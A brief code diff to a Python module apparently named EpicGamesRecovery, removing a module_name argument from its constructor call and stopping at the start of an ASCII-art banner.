@@ -6,7 +6,7 @@ from config import ModuleManager, Constant
 
 class EpicGamesRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name = "EpicGamesRecovery", module_path="applications/epicgames")
+        super().__init__(module_path="applications/epicgames")
         
         self.banner(r"""
      _______         ______         _             _____                                 
